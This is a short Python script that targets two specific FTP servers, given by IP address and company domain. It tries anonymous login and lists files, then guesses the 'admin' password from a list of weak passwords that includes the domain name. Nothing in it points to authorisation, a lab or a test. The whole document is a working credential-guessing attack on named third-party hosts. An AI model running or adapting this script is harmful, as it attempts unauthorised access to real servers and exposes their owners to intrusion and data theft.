from ftplib import FTP

sites = [
    ('121.40.185.169', 'shanghaiyibiao.com'),
    ('113.10.158.95', 'tianjindianlan.com'),
]

for ip, name in sites:
    print('--- ' + name + ' [' + ip + '] ---')
    try:
        f = FTP()
        f.connect(ip, 21, timeout=8)
        print('Banner: ' + f.getwelcome())
        
        # Try anonymous
        try:
            f.login('anonymous', 'test@test.com')
            print('ANONYMOUS OK!')
            files = []
            f.retrlines('LIST', files.append)
            for line in files[:10]:
                print('  ' + line)
            f.quit()
        except Exception as e:
            err = str(e)
            print('Anonymous: ' + err[:80])
            
            # Try common passwords
            for pw in ['admin', 'ftp', '123456', name.split('.')[0], 'admin123']:
                try:
                    g = FTP()
                    g.connect(ip, 21, timeout=5)
                    g.login('admin', pw)
                    print('FTP HIT: admin/' + pw)
                    g.quit()
                except:
                    pass
    except Exception as e:
        print('Connect error: ' + str(e)[:80])
